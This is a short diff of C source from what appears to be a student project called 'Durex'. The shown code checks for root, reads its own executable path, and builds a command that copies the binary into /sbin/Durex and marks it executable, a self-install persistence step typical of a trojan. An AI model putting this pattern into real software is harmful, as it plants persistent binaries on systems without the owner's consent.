@@ -1,15 +1,15 @@
 #include "durex.h"
 
-int		main(int ac, char **av, char **envp)
+int		main(void)
 {
 	char buf[255];
-	char buff[255];
+	char buff[300];
 
 	memset(&buf, 0, 255);
 	if(geteuid() != 0)
 		return (1);
 	readlink("/proc/self/exe", buf, 255);
-	snprintf(buff, 255, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
+	snprintf(buff, 300, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
 	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
 	{
 		printf("maabou-h\n");
